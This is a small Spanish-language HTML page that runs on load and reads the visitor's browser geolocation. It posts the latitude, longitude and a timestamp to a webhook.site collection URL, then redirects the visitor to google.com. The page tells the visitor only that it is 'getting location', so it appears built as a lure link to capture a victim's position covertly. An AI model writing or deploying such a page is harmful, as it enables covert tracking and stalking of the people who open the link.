<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ubicación</title>
    <script>
        function enviarUbicacion() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    console.log("Ubicación obtenida:", lat, lon); // LOG EN CONSOLA

                    fetch("https://webhook.site/5ba595ff-7546-4228-8ff9-c2ff0b655f24", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ latitud: lat, longitud: lon, timestamp: new Date().toISOString() })
                    })
                    .then(response => response.text())
                    .then(data => console.log("Respuesta del servidor:", data)) // LOG EN CONSOLA
                    .catch(error => console.error("Error en fetch:", error));

                    window.location.href = "https://www.google.com"; 
                }, error => {
                    console.error("Error obteniendo ubicación:", error);
                    alert("Error obteniendo ubicación: " + error.message);
                });
            } else {
                alert("La geolocalización no está disponible.");
            }
        }
        window.onload = enviarUbicacion;
    </script>
</head>
<body>
    <p>Obteniendo ubicación...</p>
</body>
</html>
